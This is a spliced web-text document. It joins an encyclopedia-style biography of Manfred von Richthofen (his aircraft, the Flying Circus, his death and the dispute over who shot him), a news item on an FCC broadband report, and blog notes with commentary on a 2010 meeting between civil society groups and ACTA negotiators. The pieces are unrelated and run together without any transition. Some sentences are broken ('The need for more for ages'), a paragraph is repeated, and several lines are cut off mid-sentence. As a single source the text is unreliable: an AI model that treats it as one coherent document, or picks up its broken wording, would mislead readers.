He switched to the Albatros D.III in January 1917 , scoring two victories before suffering an in - flight crack in the spar of the aircraft 's lower wing on 24 January , and he reverted to the Albatros D.II or Halberstadt D.II for the next five weeks .
Richthofen was flying his Halberstadt on 6 March in combat with F.E.8s of 40 Squadron RFC when his aircraft was shot through the fuel tank , quite possibly by Edwin Benbow , who was credited with a victory from this fight .
Richthofen was able to force land without his aircraft catching fire on this occasion . [ 27 ]
He then scored a victory in the Albatros D.II on 9 March , but his Albatros D.III was grounded for the rest of the month so he switched again to a Halberstadt D.II . [ 28 ]
He returned to his Albatros D.III on 2 April 1917 and scored 22 victories in it before switching to the Albatros D.V in late June . [ 25 ]
Richthofen 's all - red Fokker Dr.I
Richthofen flew the celebrated Fokker Dr. I triplane from late July 1917 , the distinctive three - winged aircraft with which he is most commonly associated — although he did not use the type exclusively until after it was reissued with strengthened wings in November . [ 29 ]
Only 19 of his 80 kills were made in this type of aircraft , despite the popular link between Richthofen and the Fokker Dr. I . [ 30 ]
It was his Albatros D.III Serial No. 789/16 that was first painted bright red , in late January 1917 , and in which he first earned his name and reputation . [ 31 ]
Richthofen championed the development of the Fokker D.VII with suggestions to overcome the deficiencies of the current German fighter aircraft . [ 32 ]
He never had an opportunity to fly the new type in combat , as he was killed before it entered service .
Flying Circus [ edit ]

Richthofen received the Pour le Mérite in January 1917 after his 16th confirmed kill , the highest military honour in Germany at the time and informally known as " The Blue Max " . [ 33 ]
That same month , he assumed command of Jasta 11 which ultimately included some of the elite German pilots , many of whom he trained himself , and several of whom later became leaders of their own squadrons .
Ernst Udet belonged to Richthofen 's group and later became Generaloberst Udet .
When Lothar joined , the German high command appreciated the propaganda value of two Richthofens fighting together to defeat the enemy in the air . [ 34 ]
Richthofen took the flamboyant step of having his Albatros painted red when he became a squadron commander .
His autobiography states , " For whatever reasons , one fine day I came upon the idea of having my crate painted glaring red .
The result was that absolutely everyone could not help but notice my red bird .
In fact , my opponents also seemed to be not entirely unaware [ of it ] " . [ 35 ]
Thereafter he usually flew in red - painted aircraft , although not all of them were entirely red , nor was the " red " necessarily the brilliant scarlet beloved of model - and replica - builders .
Other members of Jasta 11 soon took to painting parts of their aircraft red .
Their official reason seems to have been to make their leader less conspicuous , to avoid having him singled out in a fight .
In practice , red colouration became a unit identification .
Other units soon adopted their own squadron colours , and decoration of fighters became general throughout the Luftstreitkräfte .
The German high command permitted this practice ( in spite of obvious drawbacks from the point of view of intelligence ) , and German propaganda made much of it by referring to Richthofen as Der Rote Kampfflieger — " the Red Fighter Pilot . "
Richthofen ( center ) with Hermann Thomsen , German Air Service Chief of Staff ( left ) and Ernst von Hoeppner , Commanding General of the Air Service ( right ) at Imperial Headquarters in Bad Kreuznach
Richthofen led his new unit to unparalleled success , peaking during " Bloody April " 1917 .
In that month alone , he shot down 22 British aircraft , including four in a single day , [ 36 ] raising his official tally to 52 .
By June , he had become the commander of the first of the new larger " fighter wing " formations ; these were highly mobile , combined tactical units that could move at short notice to different parts of the front as required .
Richthofen 's new command , Jagdgeschwader 1 , was composed of fighter squadrons No. 4 , 6 , 10 , and 11 .
J.G. 1 became widely known as " The Flying Circus " due to the unit 's brightly coloured aircraft and its mobility , including the use of tents , trains , and caravans , where appropriate .
Richthofen was a brilliant tactician , building on Boelcke 's tactics .
Unlike Boelcke , however , he led by example and force of will rather than by inspiration .
He was often described as distant , unemotional , and rather humorless , though some colleagues contended otherwise . [ 37 ]
He taught his pilots the basic rule which he wanted them to fight by : " Aim for the man and do n't miss him .
If you are fighting a two - seater , get the observer first ; until you have silenced the gun , do n't bother about the pilot . " [ 38 ]
Although Richthofen was now performing the duties of a lieutenant colonel ( a wing commander in modern Royal Air Force terms ) , he was never promoted past the relatively junior rank of Rittmeister , equivalent to captain in the British army . [ 39 ]
The system in the British army was for an officer to hold the rank appropriate to his level of command , if only on a temporary basis , even if he had not been formally promoted .
In the German army , it was not unusual for a wartime officer to hold a lower rank than his duties implied ; German officers were promoted according to a schedule and not by battlefield promotion .
It was also the custom for a son not to hold a higher rank than his father , and Richthofen 's father was a reserve major .
Wounded in combat [ edit ]

This machine is not an all - red one
Richthofen sustained a serious head wound on 6 July 1917 , during combat near Wervik , Belgium against a formation of F.E.2d two seat fighters of No. 20 Squadron RFC , causing instant disorientation and temporary partial blindness . [ 36 ]
He regained his vision in time to ease the aircraft out of a spin and execute a forced landing in a field in friendly territory .
The injury required multiple operations to remove bone splinters from the impact area . [ 40 ] [ e ]
The Red Baron returned to active service against doctor 's orders on 25 July , [ 43 ] but went on convalescent leave from 5 September to 23 October . [ 44 ]
His wound is thought to have caused lasting damage ; he later often suffered from post - flight nausea and headaches , as well as a change in temperament .
There is a theory linking this injury with his eventual death .
Author and hero [ edit ]
During his convalescent leave , Richthofen completed an autobiographic sketch , Der rote Kampfflieger ( The Red Fighter Pilot , 1917 ) .
Written on the instructions of the " Press and Intelligence " ( propaganda ) section of the Luftstreitkräfte ( Air Force ) , it shows evidence of having been heavily censored and edited . [ 45 ]
There are , however , passages that are most unlikely to have been inserted by an official editor .
Richthofen wrote : " My father discriminates between a sportsman and a butcher .
The latter shoots for fun .
When I have shot down an Englishman , my hunting passion is satisfied for a quarter of an hour .
Therefore I do not succeed in shooting down two Englishmen in succession .
If one of them comes down , I have the feeling of complete satisfaction .
Only much later have I overcome my instinct and have become a butcher " . [ 46 ]
In another passage , Richthofen wrote " I am in wretched spirits after every aerial combat .
I believe that [ the war ] is not as the people at home imagine it , with a hurrah and a roar ; it is very serious , very grim . "
An English translation by J. Ellis Barker was published in 1918 as The Red Battle Flyer . [ 23 ]
Although Richthofen died before a revised version could be prepared , he is on record as repudiating the book , stating that it was " too insolent " and that he was no longer that kind of person . [ 47 ]
By 1918 , Richthofen had become such a legend that it was feared that his death would be a blow to the morale of the German people . [ 48 ]
He refused to accept a ground job after his wound , stating that " every poor fellow in the trenches must do his duty " and that he would therefore continue to fly in combat . [ 49 ]
Certainly he had become part of a cult of officially encouraged hero - worship .
German propaganda circulated various false rumours , including that the British had raised squadrons specially to hunt Richthofen and had offered large rewards and an automatic Victoria Cross to any Allied pilot who shot him down . [ 50 ]
Passages from his correspondence indicate he may have at least half - believed some of these stories himself . [ 51 ]
Death [ edit ]
Richthofen received a fatal wound just after 11:00 am on 21 April 1918 while flying over Morlancourt Ridge near the Somme River , .
At the time , he had been pursuing , at very low altitude , a Sopwith Camel piloted by novice Canadian pilot Lieutenant Wilfrid " Wop " May of No. 209 Squadron , Royal Air Force . [ 52 ]
May had just fired on the Red Baron 's cousin Lt. Wolfram von Richthofen .
On seeing his cousin being attacked , Manfred flew to his rescue and fired on May , causing him to pull away . [ 53 ]
Richthofen pursued May across the Somme .
The Baron was spotted and briefly attacked by a Camel piloted by May 's school friend and flight commander , Canadian Captain Arthur " Roy " Brown .
Brown had to dive steeply at very high speed to intervene , and then had to climb steeply to avoid hitting the ground . [ 52 ]
Richthofen turned to avoid this attack , and then resumed his pursuit of May . [ 52 ]
It was almost certainly during this final stage in his pursuit of May that a single .303 bullet [f ] hit Richthofen , damaging his heart and lungs so severely that it must have caused a quick death . [ 54 ] [ 55 ]
In the last seconds of his life , he managed to retain sufficient control to make a rough landing ( ) in a field on a hill near the Bray - Corbie road , just north of the village of Vaux - sur - Somme , in a sector defended by the Australian Imperial Force ( AIF ) . [ 52 ]
There were several witnesses , including Gunner Ernest W. Twycross , [ 56 ] Gunner George Ridgway , [ 55 ] and Sergeant Ted Smout of the Australian Medical Corps .
Each of these men later claimed to have been the first to reach the triplane , and each reported various versions of Richthofen 's last words , generally including the word " kaputt " . [ 57 ] [ g ]

In 2009 , Richthofen 's death certificate was found in the archives in Ostrów Wielkopolski , Poland .
He had briefly been stationed in Ostrów before going to war , as it was part of Germany until the end of World War I .
The document is a one - page , handwritten form in a 1918 registry book of deaths .
It misspells Richthofen 's name as " Richthoven " and simply states that he had " died 21 April 1918 , from wounds sustained in combat " . [ 62 ]
Debate over the identity of the individual who fired the shot that killed Richthofen [ edit ]
Controversy and contradictory hypotheses continue to surround the identity of the person who fired the shot that actually killed Richthofen .
The RAF credited Brown with shooting down the Red Baron , but it is now generally agreed that the bullet which hit Richthofen was fired from the ground . [ 55 ] [ 56 ] [ 63 ]
Richthofen died following an extremely serious and inevitably fatal chest wound from a single bullet , penetrating from the right armpit and resurfacing next to the left nipple .
Brown 's attack was from behind and above , and from Richthofen 's left .
Even more conclusively , Richthofen could not have continued his pursuit of May for as long as he did ( up to two minutes ) had this wound come from Brown 's guns . [ 55 ]
Brown himself never spoke much about what happened that day , [ i ] claiming , " There is no point in me commenting , as the evidence is already out there . " [ check quotation syntax ]
Many sources have suggested that Sergeant Cedric Popkin was the person most likely to have killed Richthofen , including a 1998 article by Geoffrey Miller , a physician and historian of military medicine , and a 2002 edition of the British Channel 4 Secret History series . [ 55 ] [ 56 ]
Popkin was an anti-aircraft ( AA ) machine gunner with the Australian 24th Machine Gun Company , and he was using a Vickers gun .
He fired at Richthofen 's aircraft on two occasions : first as the Baron was heading straight at his position , and then at long range from the plane ’s right .
Given the nature of Richthofen 's wounds , Popkin was in a position to fire the fatal shot when the pilot passed him for a second time . [ 55 ] [ 56 ]
Some confusion has been caused by a letter that Popkin wrote in 1935 to an Australian official historian .
It stated Popkin 's belief that he had fired the fatal shot as Richthofen flew straight at his position .
In this respect , Popkin was incorrect ; the bullet which caused the Baron 's death came from the side ( see above ) .
Officers and NCOs of the 24th Machine Gun Company in March 1918 .
Sergeant Cedric Popkin is second from the right in the middle row .
A 2002 Discovery Channel documentary suggests that Gunner W. J. " Snowy " Evans , a Lewis machine gunner with the 53rd Battery , 14th Field Artillery Brigade , Royal Australian Artillery is likely to have killed von Richthofen . [ 57 ]
Miller and the Secret History documentary dismiss this theory because of the angle from which Evans fired at Richthofen . [ 55 ] [ 56 ]
Other sources have suggested that Gunner Robert Buie ( also of the 53rd Battery ) may have fired the fatal shot .
There is little support for this theory . [ 55 ] [ 56 ]
In 2007 , a municipality in Sydney recognised Buie as the man who shot down Richthofen , placing a plaque near his former home . [ 64 ]
Buie died in 1964 and has never been officially recognised in any other way .[ citation needed ]
No .
3 Squadron AFC 's commanding officer Major David Blake initially suggested that Richthofen had been killed by the crew of one of his squadron 's R.E.8s , which had also fought members of Richthofen 's unit that afternoon .
This claim was quickly discounted and withdrawn , if only because of the time factor .
Following an autopsy that he witnessed , Blake became a strong proponent of the view that an AA machine gunner had killed Richthofen .[ citation needed ]
Theories about last combat [ edit ]
Richthofen was a highly experienced and skilled fighter pilot — fully aware of the risk from ground fire .
Further , he concurred with the rules of air fighting created by his late mentor Boelcke , who specifically advised pilots not to take unnecessary risks .
In this context , Richthofen 's judgement during his last combat was clearly unsound in several respects . [ 65 ]
Several theories have been proposed to account for his behaviour .
In 1999 , a German medical researcher , Henning Allmers , published an article in the British medical journal The Lancet , suggesting it was likely that brain damage from the head wound Richthofen suffered in July 1917 played a part in the Red Baron 's death .
This was supported by a 2004 paper by researchers at the University of Texas .
Richthofen 's behaviour after his injury was noted as consistent with brain - injured patients , and such an injury could account for his perceived lack of judgement on his final flight : flying too low over enemy territory and suffering target fixation . [ 66 ]
Richthofen may have been suffering from cumulative combat stress , which made him fail to observe some of his usual precautions .
One of the leading British air aces , Major Edward " Mick " Mannock , was killed by ground fire on 26 July 1918 while crossing the lines at low level , an action he had always cautioned his younger pilots against .
One of the most popular of the French air aces , Georges Guynemer , went missing on 11 September 1917 , probably while attacking a two - seater without realizing several Fokkers were escorting it . [ 67 ] [ 68 ]
There is a suggestion that on the day of Richthofen 's death , the prevailing wind was about 40 km/h ( 25 mph ) easterly , rather than the usual 40 km/h ( 25 mph ) westerly .
This meant that Richthofen , heading generally westward at an airspeed of about 160 km/h ( 100 mph ) , was travelling over the ground at up to 200 km/h ( 125 mph ) rather than the more typical ground speed of 120 km/h ( 75 mph ) .
This was considerably faster than normal and he could easily have strayed over enemy lines without realizing it . [ 65 ]
At the time of Richthofen 's death , the front was in a highly fluid state , following the initial success of the German offensive of March–April 1918 .
This was part of Germany 's last opportunity to win the war .
In the face of Allied air superiority , the German air service was having difficulty acquiring vital reconnaissance information , and could do little to prevent Allied squadrons from completing effective reconnaissance and close support of their armies .
Burial [ edit ]
No .
3 Squadron AFC officers were pallbearers and other ranks from the squadron acted as a guard of honour during the Red Baron 's funeral on 22 April 1918 .
In common with most Allied air officers , Major Blake , who was responsible for Richthofen 's body , regarded the Red Baron with great respect , and he organised a full military funeral , to be conducted by the personnel of No. 3 Squadron Australian Flying Corps .
The body was buried in the cemetery at the village of Bertangles , near Amiens , on 22 April 1918 .
Six of No. 3 Squadron 's officers served as pallbearers , and a guard of honour from the squadron 's other ranks fired a salute . [ j ]
Allied squadrons stationed nearby presented memorial wreaths , one of which was inscribed with the words , " To Our Gallant and Worthy Foe " . [ 69 ]
The funeral of Manfred von Richthofen
A speculation that his opponents organised a flypast at his funeral , giving rise to the missing man formation , [ 70 ] is most unlikely and totally unsupported by any contemporary evidence .
In the early 1920s the French authorities created a military cemetery at Fricourt , in which a large number of German war dead , including Richthofen , were reinterred . [ k ]
In 1925 von Richthofen 's youngest brother , Bolko , recovered the body from Fricourt and took it to Germany .
The family 's intention was for it to be buried in the Schweidnitz cemetery next to the graves of his father and his brother Lothar von Richthofen , who had been killed in a post - war air crash in 1922 . [ 71 ]
The German Government requested that the body should instead be interred at the Invalidenfriedhof Cemetery in Berlin , where many German military heroes and past leaders were buried , and the family agreed .
Richthofen 's body received a state funeral .
Later the Third Reich held a further grandiose memorial ceremony at the site of the grave , erecting a massive new tombstone engraved with the single word : Richthofen . [ 72 ]
During the Cold War , the Invalidenfriedhof was on the boundary of the Soviet zone in Berlin , and the tombstone became damaged by bullets fired at attempted escapees from East Germany .
In 1975 the body was moved to a Richthofen family grave plot at the Südfriedhof in Wiesbaden . [ 73 ]

Number of victories [ edit ]
For decades after World War I , some authors questioned whether Richthofen had achieved 80 victories , insisting that his record was exaggerated for propaganda purposes .
Some claimed that he took credit for aircraft downed by his squadron or wing .
In fact , Richthofen 's victories are unusually well documented .
A full list of the aircraft the Red Baron was credited with shooting down was published as early as 1958 [ 74 ] — with documented RFC / RAF squadron details , aircraft serial numbers , and the identities of Allied airmen killed or captured — 73 of the 80 listed match recorded British losses .
A study conducted by British historian Norman Franks with two colleagues , published in Under the Guns of the Red Baron in 1998 , reached the same conclusion about the high degree of accuracy of Richthofen 's claimed victories .
There were also unconfirmed victories that would put his actual total as high as 100 or more . [ 75 ]
For comparison , the highest - scoring Allied ace , the Frenchman René Fonck , achieved 75 confirmed victories [ 76 ] and a further 52 unconfirmed behind enemy lines . [ 75 ]
The highest - scoring British Empire fighter pilots were Canadian Billy Bishop , who was officially credited with 72 victories , [ 77 ]
Mick Mannock , with 61 confirmed victories , [ 78 ] [ 79 ]
Canadian Raymond Collishaw , with 60 , [ 80 ] and James McCudden , with 57 confirmed victories .
Richthofen 's early victories and the establishment of his reputation coincided with a period of German air superiority , but he achieved many of his successes against a numerically superior enemy , who flew fighter aircraft that were , on the whole , better than his own . [ 74 ]
Honours , tributes and relics [ edit ]
Memorial in Polish at Richthofen 's former home in Świdnica ( formerly Schweidnitz )

Relics [ edit ]
Captain Roy Brown donated the seat of the Fokker triplane in which the German flying ace made his final flight to the Royal Canadian Military Institute ( RCMI ) in 1920 . [ 81 ]
Apart from the triplane 's seat , the RCMI , in Toronto , also holds a side panel signed by the pilots of Brown 's squadron .
The engine of Richthofen 's Dr.I was donated to the Imperial War Museum in London , where it is still on display .
The museum also holds the Baron 's machine guns .
The control column ( joystick ) of Richthofen 's aircraft can be seen at the Australian War Memorial in Canberra .
Decorations and awards [ edit ]
Tributes [ edit ]
At various times , several different German military aviation Geschwader ( literally " squadrons " ; equivalent to Commonwealth air force " groups " , French escadrons or USAF " wings " ) have been named after the Baron :
In 1941 a newly - launched Kriegsmarine ( German navy ) seaplane tender received the name '' Richthofen ' ' [ de ] .
In 1968 Richthofen was inducted into the International Air & Space Hall of Fame . [ 83 ] [ need quotation to verify ]
" Red Flag " , the US Air Force 's counterpart to TOPGUN , was an outgrowth of Project Red Baron , which happened in three phases ( c. 1966 to c. 1974 ) during the period of the Vietnam War .

Up to 24 million Americans lack access to broadband , the Federal Communications Commission announced Tuesday .
Between 14 and 24 million people in the country lack access to high - speed Internet , and immediate prospects for them accessing this service is bleak , the commission said in its sixth annual report to Congress about the state of deployment .
The 14 million tally would about equal the 2005 estimated populations of New York City , Los Angeles , and Chicago combined .
The FCC said the results underscore the need for reform to the Universal Service Fund , innovative approaches to spectrum allocation , the removal of barriers to infrastructure investment , and better broadband data collection .
None of these suggestions are really new , of course .
The need for more for ages , and are already under way .
The report did , however , update its definition of what constitutes broadband service .
For over a decade , the standard has been set at 200 kilobits per second downstream , but the FCC now puts it at 4 Mbits /s downstream and 1 Mbits /s upstream .
" This is a minimum speed generally required for using today 's video - rich broadband applications and services , while retaining sufficient capacity for basic web browsing and e-mail , " the FCC said .
The report also outlines states that would qualify as being " unserved " by broadband .
The data used to calculate this , however , is based on Census Tract information , as well as ISP subscriber information , so the FCC cautioned that it is not as complete as possible .
More detailed broadband data information is in the process of being collected .
Tuesday 's study , however , identified 39 states that have areas without broadband access .
States not on that list are mostly in the Northeast , including New Jersey , New York , Connecticut , Maine , New Hampshire , Vermont , Pennsylvania , Massachusetts , Delaware , Maryland , and Rhode Island .

ACTA Negotiators Respond To Questions About ACTA ; More Of The Same
from the you - wo n't - like - the - answers - though dept
On June 28 , 2010 , at 7:30 pm Swiss time , a group of civil society representatives met with 21 ACTA negotiators .
The negotiators included representatives ( 21 in all ) from the Switzerland , France , Australia , New Zealand , Singapore , Mexico , Japan , U.S. , Morocco , Canada and Korea ....
It was agreed that , reflecting civil society 's objectives to represent and report back to the broader public , this meeting would be on the record .
The following are notes taken by Sean Flynn , American University Washington College of Law's Program on Information Justice and Intellectual Property .
These notes are direct quotes to the best of my note taking ability and memory .
But others at the meeting may have more complete notes in some areas .
Rohit Malpani of Oxfam and Sanya Smith of TWN were also taking notes .
The questions raised were given to the negotiators in advance and the answers were represented as those of the collective views of the negotiators rather than of an individual negotiator unless otherwise indicated .
Unless otherwise indicated , the speaker is the chair of the Swiss Delegation who was appointed to speak for the group .
There are a couple news items here .
First , there is an " emerging consensus " to take patents out of the border measure chapter , but not out of the rest of the agreement .
Some parties appear to desire to take patents out of the whole text .
The EU appears to be in favor of leaving patents in the civil chapter .
The change appears to be a rather direct result of concerns raised by access to medicines advocates .
There are still major concerns on access to medicines and free flow of goods in the border chapter .
Negotiators seem committed to requiring in transit seizure and it is possible ( although there seems some division ) that it will include common trademark infringements and non-commercial scale copyright infringement , thus reaching far beyond TRIPS standards .
out of the rest of the agreement .

There are still major concerns on access to medicines and free flow of goods in the border chapter .
Negotiators seem committed to requiring in transit seizure and it is possible ( although there seems some division ) that it will include common trademark infringements and non-commercial scale copyright infringement , thus .
There was an admission that countries may have to change their laws to comply with ACTA .
That may not be real news , but I have not heard it admitted by a delegate before .
But the EU continued to press that they will not change their laws .
There seemed to be little desire to remove or narrow considerably the internet chapter .
There was a desire by some delegates to ensure that DMCA - like protections are in the ACTA internet chapter .
Several discussed ( off line ) the desire to combat " file sharing , " even apparently when not done on a commercial scale .
Q : Will negotiators commit to continue releasing the text of the Agreement following completion of this week 's negotiating round and subsequently until the completion ( or abandonment ) of negotiations ?
A : This is a question that the delegation takes up at end of each round .
This will be a question to be discussed and agreed by consensus .
On issue of public comments , this is a plurilateral process and each country will have to take that into account .
It is not as if the ACTA group is a formal organization .
For a plurilateral agreement , we have promoted a great deal of transparency already more than in other agreements .
Q. Wait .
In other processes ( e.g. anything done at WIPO or the example of the Doha declaration ) civil society got access to text before and after each round .
That has not been the case here .
We received text once , after years of negotiations and close to what you declared to be the end point of the discussions .
A. Those are multilateral negotiations .
This is a plurilateral negotiation .
We do not have a secretariat to assist with such matters .
This has been an extremely transparent process .
Q : Are negotiators reviewing the text of the Agreement to ensure it is fully consistent with the WTO TRIPS Agreement ?
Will the WTO or other independent legal experts be asked to review the text of the Agreement to ensure it is legally consistent with WTO rules ?
Will you provide clear and objective information regarding the evidence base upon which ACTA is purportedly justified , as far as international law , access to medicines and Internet are concerned ?
A : This is in the process of being negotiated .
It is clear that parties are WTO members and they have rights and obligations under WTO .
This does not change if they should join ACTA .
There is dispute settlement possibility .
If there is a question of compliance then another interested WTO member could invoke dispute settlement .
With regard to the press release of the 8th round , the negotiators declared that the ACTA will be consistent with TRIPS and Doha .
On the question of the evidence base -- the ACTA countries are seriously concerned about the phenomena of growing counterfeiting and piracy .
We will not cite one particular figure or study .
Taken together the development cannot be denied .
Whether it is about real or intellectual property it is the government 's duty to provide effective enforcement .
More effective enforcement standards are needed to address this phenomenon .
Q : Criminal sanctions are being negotiated , which imply the usage of police & judiciary systems , as proven by the presence among the negotiators of the EU Presidency .
How can you justify any legitimacy for criminal sanctions ( which highly impact fundamental freedoms ) being negotiated outside of any democratic frame , in the secrecy of what is much more than a " trade agreement " ?
A : I think here it is important to point out that the ACTA negotiations are no different than other inter party negotiations .
If at the end the agreement should contain additional obligations for a party compared to a country 's laws , implementation of the ACTA will necessitate that it will adjust its national legal situation .
For most countries , simply the approval of ACTA is dependent on parliamentary approval .
Thus we very much do believe that the democratic process is being complied with .
And this process of consulting with stakeholders is evidence of that commitment .
Q : What is the prevailing definition of a ' counterfeit ' amongst negotiators ?
With respect to pharmaceuticals , is it the official position of negotiators that medicines which are suspected of patent infringement are counterfeit ?
If not , will you commit to ensure that the entirety of ACTA excludes patents from the scope of the agreement as the inclusion of patents is unrelated to the issue of counterfeit , and poses significant risks for access to medicines in developing countries ?
A . The issue of definitions is still under negotiation .
The only definition currently in the text is for counterfeit trademark goods , which reflects the TRIPS agreement .
As regard to risks to access to medicines in developing countries , which is a concern also raised in question 5 : As far as border measures is concerned there is an emerging consensus that patents should not be included in border measures .
Q . The concern about patents is much broader .
The April draft mentions patents in every section of the text , at least in brackets .
A. I can only say that there is an emerging consensus on patents being taken out of border measures .
Q : Should customs authorities be authorized to seize medicines in ' transit countries ' , even when the medicines do not infringe any laws in the producing or importing countries ?
Will you commit to ensure that any inclusion of ex officio action and / or in - transit seizures is optional and not mandatory for countries ?
If permitted , do negotiators maintain that customs officials in exporting , transit or importing countries are capable of determining whether medicines infringe patents or whether a pharmaceutical product is ' confusingly similar ' ?
Should there be any anti-abuse provisions included ?
Follow up question :
You said that there is an emerging consensus to take patents out of border measures , but you did not comment on the broader question of applying transit measures to all trademark infringement was opposed to the more limited set of true criminal trademark counterfeiting .
Nor did you address the question of whether there will be transit seizures authorized based on the law of the transit country rather than the law of the country of importation , as TRIPS Art. 52 requires .
A : We see trademarks and patents as different .
We see justification to have trademark in the scope of border measures .
This is the most common practice we are trying are trying to respond to .
There is little justification for someone who chooses a mark that is confusingly similar , to the degree that it cannot be distinguished from the original mark .
Q . You seem to be confusing two standards in your answer .
The standard that a mark cannot be distinguished from the original -- that it is identical or intended to be identical -- is a criminal counterfeit .
But the concept of trademark infringement is much broader , at least in U.S. law .
The question is whether you are applying the same border measure seizure standards to alleged counterfeits as to alleged confusingly similar trademark violations which are normally a civil matter and involves more complex legal and factual determinations .
Do you understand the distinction we are making ?
A : A mark that is confusingly similar is counterfeit .
( A from Susan Wilson , U.S. ) : Wait a minute .
There are civil , criminal and administrative remedies for multiple kinds of trademark violations .
But there are only criminal sanctions for counterfeiting -- using an identical label .
The category of confusingly similar is only subject to civil remedies in most countries .
There is a distinction there .
Confusingly similar is not the counterfeit legal standard .
Q. Thank you .
And the question is whether the confusingly similar standard of trademark infringement , as opposed to counterfeiting , is being included for consideration for in transit seizures of goods , ex officio [ on the official 's own instigation , without a complaint ] , based on a suspicion or prima facie evidence .
That is the Amoxicillin case and it worries access to medicines advocates .
Is that still on the table or is there an emerging consensus to remove that standard ?
A : There is no emerging consensus .
It is still on the table in the border chapter .
Q : Could negotiators list out the relevant anti-abuse provisions in ACTA to ensure that rights holders do not use the Agreement to expand intellectual property protection for products , including medicines ?
ACTA currently contains no pro-consumer provisions and minimal protections for an alleged infringer , alongside maximum privileges and incentives for a right - holder to allege infringement ( including extraordinarily limited liability for abuse of recourse measures ) .
The enforcement provisions are universally mandatory while the protections are optional .
There are virtually no references to exceptions and limitations , or to TRIPS flexibilities and safeguards .
Do negotiators feel that sufficient balance has been achieved under the Agreement ?
A : ACTA delegates would like to make clear that ACTA is not about substantive standards .
It is not to expand existing rights .
With regard to alleged infringers , the agreement may not directly address this issue .
National law on the protection of consumers will apply to implementation at the national level .
ACTA delegates do consider that ACTA provides for exceptions .
E.g. the de minimus provision has been proposed by some parties and is being considered .
With regard to maximum privileges to prohibit abuse , I can point to parts of the draft permitting rights holders to request customs authorities to assist with border measures and the authorities may ask for security before asking for assistance .
One consistent problem with the April draft is that is incorporates some but not all TRIPS protections from abuse , balancing provisions and proportionality requirements .
The de minimus provision referred to is a direct quote from TRIPS .
But in many other areas the agreement repeats or expands a TRIPS enforcement measure but omits any reference to the accompanying abuse protection or balancing feature in TRIPS .
The Washington Communique notes , for example , that ACTA fails " to fully protect and incorporate key protections against abuse ( e.g. Articles 41.1 , 48.1 , 48.2 , 50.3 , 53.1 , 56 ) , flexibilities to promote public interests ( e.g. TRIPS Art. 44.2 ) , requirements for the proportionality of enforcement measures ( e.g. Arts. 46 , 47 ) , and provisions providing for balance between the interests of proprietors , consumers and the greater society ( e.g. TRIPS Arts .
1 , 7 , 8 , 40 , 41.2 , 41.5 , 54 , 55 , 58 ) . "
Q : Are negotiators aware that the Agreement could create third party liability for suppliers of active pharmaceutical ingredients whose materials may be used in mislabeled products without their knowledge ?
What are the reasons for holding suppliers of active pharmaceutical ingredients unknowingly liable for mislabeled products ?
A : Liability is still under negotiations .
Under national laws , liability depends on knowledge and fault .
These national standards will still apply in this context .
Q : ACTA can become a very strict text should certain proposals be followed , not leaving much room to maneuver for its application .
Are contracting parties foreseeing to include in the agreement exceptions to preserve the public interest or flexibilities allowing for adaptation to different national realities ?
Will you remove institutional measures in which ACTA Member countries attempt to export heightened TRIPS - plus IP protections to other countries , and in particular developing countries
A : All the parties are negotiating to enter this agreement in an autonomous , voluntary manner .
ACTA parties see that the agreement they would like to fashion will leave parties free to implement as they see fit in their national system .
Q : How do you guarantee that policies required to benefit from liability safe harbour for Internet service / access providers wo n't have the effect to force them to restrict fundamental freedoms -- such as freedom of expression and communication , privacy , and the right to a fair trial -- turning them , via contractual policies , into private copyright police / justice ?
A : It is important to recall that ACTA parties have expressed concern about fundamental rights after Wellington .
We are aware of the importance of this matter and we have made clear . . .
It is clear that ACTA parties are bound by human rights declarations and their own constitutions .
ACTA will obviously have to comply with those norms .
Q. but you think encouraging companies to take down expression is respecting rights ?
This is how you make enforcement comply with freedom of expression ?
A. from French delegate :
You think in EU we live in a totalitarian state ?
Is France a dictatorship ?
Have you no rights in France ?
Q. That is not my question .
A. I am telling you it will comply with EU law .
Are you saying EU does not comply with fundamental freedoms ?
Q. It is companies that collect the information .
You are encouraging the companies to use that information in ways that , if done by the state , would violate fundamental privacy protections .
Is that promoting fundamental rights ?
A ( French ) : Is France a totalitarian state ?
Is it ?
Q : No , that is not what I am saying .
Ok , fine .
You have addressed the issue .
Lets move on .
Q : There have been no open hearings or other engagements with civil society since the text was released .
Will you commit for the establishment of consistent mechanisms for the ongoing engagement of civil society ?
More generally , how are you going to fix the process to encourage greater public deliberation on the record , with access to text , and in a meaningful setting ?
And how are you going to fix all of the specific concerns raised in the previous questions and in all the critics upon ACTA made until now ?
A : This is the responsibility of each ACTA country itself .
This is underway .
It is happening according to the rules and practices of each member .
It is a country choice .

Yesterday , we wrote about plans for some civil society groups to meet with ACTA negotiators with a list of 10 questions about ACTA and ACTA negotiations .
Sean Flynn has now sent over a report from the meeting , as well as his quick transcription of the responses to the questions .
First , his summary ( with my emphasis on key points ) : I agree with Flynn that this is the first time I 've heard any negotiator admit that this might change laws .
We 've heard negotiators from the US , EU and elsewhere all claim that this would n't change laws at home , but we had n't found anyone willing to admit that it would change laws elsewhere .
As for that last point , it 's really disappointing that these negotiators still want to cram something totally unrelated to actual counterfeiting into this bill , and do so in such a ham - fisted manner that does n't take into account important realities in the marketplace , but instead interprets the situation exactly as a small contingent of companies wants them to see the situation .
As for the full Q&A including both questions listed yesterday and some followups , Sean provides the following account , with my commentary in between :
This is a huge cop - out of an answer .
First of all , this has n't been anywhere close to an " extremely transparent process . "
The whole thing has been totally secret other than bland content - less press releases .
The full document was released once after nearly a year of public screaming about it and a huge slap down by nearly the entire EU Parliament .
Claiming that there 's some sort of different issue between plurilateral negotiations and multilateral ones is hiding behind semantics .
Incredible .
No evidence is provided at all nor do they commit to providing any evidence .
Instead , it 's just " trust us , we know there 's a problem . "
Ridiculous .
Faith - based policy making which actually contradicts the evidence , which the negotiators refuse to look at .
Shameful .
This is the point mentioned in the summary about admitting that some countries will have to change their laws .
But , again , the answer is extremely misleading .
It pretends that , after ACTA is signed , sealed and delivered , various countries might then choose not to implement parts of it via the democratic process .
This ( very much on purpose ) ignores what these negotiators know happens in these situations , which is that the industry supporters , who wrote the trade agreement , then go on a massive PR / government relations campaign declaring how this or that country is " not living up to its international obligations , " and highlights how that country is falling behind and damaging this particular industry because it wo n't change its laws to meet those " international obligations . "
It happens all the time .
It 's not a truly democratic process at all , because the scales are weighted so heavily that it 's nearly impossible for countries not to agree .
What a mess .
It appears that the negotiators here do n't even quite realize the extent of what they 're negotiating and the potential impact of their negotiations .
Having one negotiator claim that " a mark that is confusingly similar is counterfeit " is scary in its ignorance of what was being discussed .
Here I 'll let Flynn handle the commentary himself :
Onwards : Again avoiding the actual reality on the ground .
